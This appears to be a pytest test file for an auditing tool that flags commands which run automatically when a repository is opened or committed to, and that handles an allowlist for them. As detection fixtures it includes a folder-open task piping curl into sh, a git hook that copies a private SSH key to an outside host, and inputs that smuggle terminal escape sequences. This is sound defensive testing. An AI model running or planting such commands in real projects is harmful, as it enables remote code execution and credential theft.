from __future__ import annotations

import json
import tomllib
from pathlib import Path

import pytest
from typer.testing import CliRunner

from autorun_audit import allowlist
from autorun_audit.cli import app
from autorun_audit.models import Finding, Severity

runner = CliRunner()


def task_json(command: str) -> str:
    return json.dumps(
        {"tasks": [{"label": "dev", "command": command, "runOptions": {"runOn": "folderOpen"}}]},
        indent=2,
    )


@pytest.fixture
def repo(tmp_path: Path) -> Path:
    root = tmp_path / "repo"
    (root / ".vscode").mkdir(parents=True)
    (root / ".vscode/tasks.json").write_text(task_json("npm run dev"), encoding="utf-8")
    (root / ".envrc").write_text("layout python\n", encoding="utf-8")
    return root


def invoke(*args: str) -> tuple[int, str]:
    result = runner.invoke(app, list(args))
    return result.exit_code, result.output


def test_write_then_use_allowlist(repo: Path, tmp_path: Path) -> None:
    allow = tmp_path / "allow.toml"
    code, _ = invoke("repo", str(repo), "--write-allowlist", str(allow))
    assert code == 0
    data = tomllib.loads(allow.read_text(encoding="utf-8"))
    assert {e["rule"] for e in data["allow"]} == {"vscode.task.folder-open", "direnv.envrc"}
    assert all(e["reason"] == allowlist.DEFAULT_REASON for e in data["allow"])
    assert "# $ npm run dev" in allow.read_text(encoding="utf-8")

    code, output = invoke("repo", str(repo), "--allowlist", str(allow))
    assert code == 0
    assert "Nothing auto-runs" in output
    assert "2 more allowed by" in output


def test_changed_command_is_reported_again(repo: Path, tmp_path: Path) -> None:
    allow = tmp_path / "allow.toml"
    invoke("repo", str(repo), "--write-allowlist", str(allow))
    (repo / ".vscode/tasks.json").write_text(
        task_json("curl -s https://example.invalid/x | sh"), encoding="utf-8"
    )

    code, output = invoke("repo", str(repo), "--allowlist", str(allow), "-f", "json")
    data = json.loads(output)
    assert code == 1
    assert [f["rule"] for f in data["findings"]] == ["vscode.task.folder-open"]
    assert data["findings"][0]["severity"] == "critical"
    assert [e["rule"] for e in data["stale_allowlist_entries"]] == ["vscode.task.folder-open"]


def test_moving_lines_keeps_the_fingerprint(repo: Path, tmp_path: Path) -> None:
    allow = tmp_path / "allow.toml"
    invoke("repo", str(repo), "--write-allowlist", str(allow))
    tasks = repo / ".vscode/tasks.json"
    tasks.write_text("\n\n\n" + tasks.read_text(encoding="utf-8"), encoding="utf-8")
    code, _ = invoke("repo", str(repo), "--allowlist", str(allow))
    assert code == 0


def test_rewrite_keeps_reasons(repo: Path, tmp_path: Path) -> None:
    allow = tmp_path / "allow.toml"
    invoke("repo", str(repo), "--write-allowlist", str(allow))
    allow.write_text(
        allow.read_text(encoding="utf-8").replace(allowlist.DEFAULT_REASON, "dev server", 1),
        encoding="utf-8",
    )
    invoke("repo", str(repo), "--write-allowlist", str(allow))
    reasons = sorted(e["reason"] for e in tomllib.loads(allow.read_text())["allow"])
    assert reasons == sorted(["dev server", allowlist.DEFAULT_REASON])


def test_repo_allowlist_is_never_loaded_implicitly(repo: Path) -> None:
    # A malicious repository can't approve its own payload by shipping an allowlist.
    invoke("repo", str(repo), "--write-allowlist", str(repo / ".autorun-audit.toml"))
    code, output = invoke("repo", str(repo))
    assert code == 1
    assert "folder-open" in output


def test_hidden_findings_still_fail_and_are_not_stale(repo: Path, tmp_path: Path) -> None:
    allow = tmp_path / "allow.toml"
    invoke("repo", str(repo), "--write-allowlist", str(allow), "--min-severity", "low")
    code, output = invoke(
        "repo", str(repo), "--allowlist", str(allow), "--min-severity", "critical", "-f", "json"
    )
    data = json.loads(output)
    assert code == 0
    assert data["stale_allowlist_entries"] == []


def test_sarif_marks_allowed_results_as_suppressed(repo: Path, tmp_path: Path) -> None:
    allow = tmp_path / "allow.toml"
    invoke("repo", str(repo), "--write-allowlist", str(allow))
    code, output = invoke("repo", str(repo), "--allowlist", str(allow), "-f", "sarif")
    results = json.loads(output)["runs"][0]["results"]
    assert code == 0
    assert len(results) == 2
    assert all(r["suppressions"][0]["kind"] == "external" for r in results)
    assert all(r["partialFingerprints"]["autorunAudit/v1"].startswith("sha256:") for r in results)


@pytest.mark.parametrize(
    "content",
    [
        "allow = 3\n",
        "[[allow]]\nrule = 'x'\n",
        "[[allow]]\nrule = 'x'\npath = 'y'\nfingerprint = 'md5:abc'\n",
        "not toml [[[",
    ],
)
def test_invalid_allowlist_is_usage_error(repo: Path, tmp_path: Path, content: str) -> None:
    allow = tmp_path / "allow.toml"
    allow.write_text(content, encoding="utf-8")
    code, _ = invoke("repo", str(repo), "--allowlist", str(allow))
    assert code == 2


def test_missing_allowlist_is_usage_error(repo: Path, tmp_path: Path) -> None:
    code, _ = invoke("repo", str(repo), "--allowlist", str(tmp_path / "nope.toml"))
    assert code == 2


def test_invisible_characters_are_escaped_in_the_file(tmp_path: Path) -> None:
    sneaky = Finding(
        rule="r",
        severity=Severity.HIGH,
        path="dir/evil‮txt.json",
        trigger="t",
        message="m",
        command='echo "hi"\x1b[2K\tdone',
    )
    allow = tmp_path / "allow.toml"
    allowlist.write(allow, [sneaky])
    text = allow.read_text(encoding="utf-8")
    assert "‮" not in text
    assert "\x1b" not in text
    assert "\\u202e" in text
    [entry] = allowlist.load(allow).entries
    assert entry.path == sneaky.path
    assert entry.fingerprint == sneaky.fingerprint


def test_terminal_output_cannot_inject_escape_sequences(tmp_path: Path) -> None:
    (tmp_path / ".vscode").mkdir()
    (tmp_path / ".vscode/tasks.json").write_text(
        task_json("echo safe\u001b[2K\u001b[1Ahidden"), encoding="utf-8"
    )
    _, output = invoke("repo", str(tmp_path))
    assert "\x1b[2K" not in output
    assert "\\u001b[2K" in output


def test_appending_to_an_allowed_hook_brings_it_back(tmp_path: Path) -> None:
    # The command shown for a hook is only its first line, so the fingerprint must cover
    # the whole file: otherwise a payload added below an approved line would stay hidden.
    root = tmp_path / "repo"
    hook = root / ".githooks/pre-commit"
    hook.parent.mkdir(parents=True)
    hook.write_text("#!/bin/sh\nruff check\n", encoding="utf-8")
    allow = tmp_path / "allow.toml"
    invoke("repo", str(root), "--write-allowlist", str(allow))
    assert invoke("repo", str(root), "--allowlist", str(allow), "--fail-on", "low")[0] == 0

    hook.write_text(
        "#!/bin/sh\nruff check\nscp ~/.ssh/id_ed25519 example.invalid:\n", encoding="utf-8"
    )
    code, output = invoke("repo", str(root), "--allowlist", str(allow), "--fail-on", "low")
    assert code == 1
    assert ".githooks/pre-commit" in output
